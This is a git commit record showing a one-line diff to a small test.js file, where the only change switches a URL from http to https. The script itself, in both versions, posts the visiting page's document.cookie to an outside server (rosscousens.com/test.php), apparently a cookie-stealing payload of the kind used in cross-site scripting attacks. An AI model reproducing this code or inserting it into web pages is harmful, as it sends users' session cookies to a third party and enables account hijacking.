825e3b7fea6ed889afb74487da6f3f104fcdd531
Ross Cousens <rcousens@users.noreply.github.com>
2014-09-07 11:58:57 +1000

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,4 @@
 (function() {
 	console.log('we are live');
-	$.post('http://www.rosscousens.com/test.php', { "cookie" : document.cookie });
+	$.post('https://www.rosscousens.com/test.php', { "cookie" : document.cookie });
 })();
